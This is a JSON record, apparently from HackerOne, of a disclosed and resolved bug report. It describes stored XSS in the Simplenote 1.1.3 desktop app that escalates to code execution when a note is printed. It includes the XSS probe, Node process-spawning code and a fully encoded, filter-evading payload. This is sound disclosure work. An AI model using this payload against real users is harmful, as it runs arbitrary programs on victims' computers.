@@ -1,0 +1,145 @@
+{
+  "id": 358049,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTgwNDk=",
+  "url": "https://hackerone.com/reports/358049",
+  "title": "RCE via Print function [Simplenote 1.1.3 - Desktop app] ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-27T09:33:36.011Z",
+  "submitted_at": "2018-05-27T09:33:36.011Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "luigigubello",
+    "url": "/luigigubello",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/205/454/14e5efd804ea443960f0c227998baf8d144b0611_original.jpeg/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-07-26T08:26:07.139Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-06-26T08:26:03.226Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "In **Simplenote 1.1.3 - Desktop app** there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\n\nThis report is based on the [report **#291539**](https://hackerone.com/reports/291539), by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\n\n# Step to reproduce\n\n## 1 - Prerequisites\n\n- Download and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\n- Markdown must **not** be enabled\n\n## 2 - Stored XSS\n\nCreate a new note, and you write this text:\n```\n\">'><details/open/ontoggle=confirm('XSS')>\n```\nNow go to **File** --> **Print**. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\n\n## 3 - From XSS to RCE\n\nThanks to [**ysx**] (https://hackerone.com/ysx), I used the code in his proof-of-concept.\nThe code to open the Gnome calculator in Debian is:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nNow you use the functions `writeln()` and `String.fromCharCode()` to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:\n\n```\n\">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>\n```\n\nYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\n\nI have attached two screenshots and a proof-of-concept video.\n\n## Impact\n\nAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 302301,
+      "file_name": "simplenote_rce_screen.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/301/bf86f47e8f3e6b6bdab6fd0ee2e35dba0d8ed32c/simplenote_rce_screen.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153020Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=75374ad76e9433bea0de981452d5cddab6392e6097ba3bdc348c8b97952907b9",
+      "file_size": 458022,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 302302,
+      "file_name": "simplenote_rce_poc.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/302/2c46c8d847b2d0372cd7cdbf672722b2ac042502/simplenote_rce_poc.mp4?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_poc.mp4%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_poc.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153020Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=081ebcfaf705617f891ddef787dea61ff7ae71e968cbcdb7f2d6e4cb5b23d2f8",
+      "file_size": 3254525,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 302303,
+      "file_name": "simplenote_rce_screen2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/302/303/499be97b185aca85e2a88a6310183a460cbe7c0f/simplenote_rce_screen2.png?response-content-disposition=attachment%3B%20filename%3D%22simplenote_rce_screen2.png%22%3B%20filename%2A%3DUTF-8%27%27simplenote_rce_screen2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWPEODDBF%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T153020Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJHMEUCIQC29PU%2FjrhrTrwuQy3LCYqDX7UOerD9wzLzz4mr1y37%2BAIgUYd%2FG9GVl%2BwK5Rp%2BxodG0dOErIQ8NZcO3D966hxiDMkquwUI6P%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDEsyD6YaEw%2BDun6YYSqPBYhYjKBX2bPG%2FFuZPmK37I0cJbJBCYOAvXftpysm%2BzXReAWxV6%2FUEbHl1un6%2B%2Bc6%2Fz44dS5%2B57KTilNptTJDUPZZQ8FGJ2AKX5PViJicXrcDMZbAoiFLyH9prJVs%2FwzgnZHX4osrWBFuNA0L7gDeqn9SNQ5Gknukt4vVfR580vRiHCTjBQsFHkXX%2Bs%2BLdf1v1Or7GsRN5H3lgDCnP3HLxEFvmkyB4i3NV0OH9YHSS8t0h2%2BVYGlht0PblS7mXUNl7gZKCaR5Hofafl0RMPHPdoPXTZdqVXV9VEFZJz1G6gQvbBImtHecquEMH%2Fp%2BT%2FCGdxX2U1aEJJCnshObrFAnudfvFrqvpY98eh1ailkKprI1SGbzbGmv%2ByKV3ClxJc5B4vckjM9O%2BC9owspxmNIx76CH4efb1gKtZDPutfIcFJSPgei5AViOYxt5vyGemlkfr9wkSCWqlNo0YEybBy8xdgTFfPIkqyxTmYZYXvQ%2B7NdbJgk8peowaTR7vnDBY5DY4w1XodT3MfYN5vCe45m2Zon7kKtcghPlp87Kk1b1NLWsjfqxLxBEiXc9VFQCcB3CIvYCJZ%2FjLY2Ov%2BFQVnJyPnkIixAJlGcyRtEaoiBqPWo5HFkvJ4%2FWC8YtfDQ%2BVCXqdjFw7KNlaWM4e76l7V5uZRZZIXwMRpUJJAti6e%2FgXP7a9WsS9D4I08H1a1x8h8g7HbjzcJMw0r6gINTJV%2B5NXx73Qxk7RXhqRycxrb473rokw1xPILHgwI36zQn0Ts9sXbwkUwioDWq4ueAOEsCqF0dul8fV4iI6Gbc7do3O%2BAs9bQokeb5KRo74UveVYA8F9w9boCn41xC928jKCUJfiXx1BLMQDWgd4IdDKIaveAcwkI79zwY6sQEbJwA2tB95lkFkWC%2FHXhPskbReU5Ub2jfXdmrffI5v05h%2B4Y7yCH%2BnlPexgdDZsQfvtYmzM0FbTZMHwoeNtm6bCbBQgBrtftx56Ooky6Z%2BIofWcb1M%2FAT5NrmyX99k5BaCJO3yTBLTiQI1EKTjbJQI%2Bc518mAGsJ6A0AZWQWy5oWC5TcNd%2FN4ieUqv10JEIKH%2B3eL5VixEcr9L83YVpmnpiGzV0ulYxlc5rPo%2B1vPLn%2BU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8042e8475403fa16ec4a8b72ab1e92055df2314799686d27884dd8934a7555a7",
+      "file_size": 516985,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-07-26T08:26:03.366Z",
+  "allow_singular_disclosure_after": -245747057.04230592,
+  "singular_disclosure_allowed": true,
+  "vote_count": 28,
+  "voters": [
+    "muon4",
+    "h1bountyoverflow",
+    "savitar0x01",
+    "ahiezer",
+    "apapedulimu",
+    "superman85",
+    "naategh",
+    "geeknik",
+    "eveeez",
+    "khizer47",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
